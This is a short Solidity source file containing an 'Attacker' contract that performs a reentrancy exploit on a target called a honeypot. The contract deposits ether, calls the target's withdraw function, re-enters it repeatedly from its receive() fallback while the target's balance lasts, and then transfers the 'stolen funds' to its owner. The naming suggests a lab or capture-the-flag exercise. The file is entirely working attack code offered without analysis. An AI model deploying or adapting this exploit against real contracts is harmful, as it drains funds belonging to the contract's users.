// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IHoneypot {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IHoneypot public honeypot;
    address public owner;

    constructor(address _honeypotAddress) {
        honeypot = IHoneypot(_honeypotAddress);
        owner = msg.sender;
    }

    // Fallback function: This intercepts incoming tokens and loops back
    receive() external payable {
        if (address(honeypot).balance >= 0.1 ether) {
            honeypot.withdraw();
        }
    }

    // Starts the exploit game
    function launchAttack() public payable {
        require(msg.sender == owner, "Only owner can launch attack");
        // Step A: Seed the exploit balance check inside Honeypot
        honeypot.deposit{value: msg.value}();
        // Step B: Call the vulnerable function to start the loop
        honeypot.withdraw();
    }

    // Recover the bounty rewards after a successful exploit
    function withdrawStolenFunds() public {
        require(msg.sender == owner, "Only owner can claim");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
require(success, "Bounty withdrawal failed");
    }
}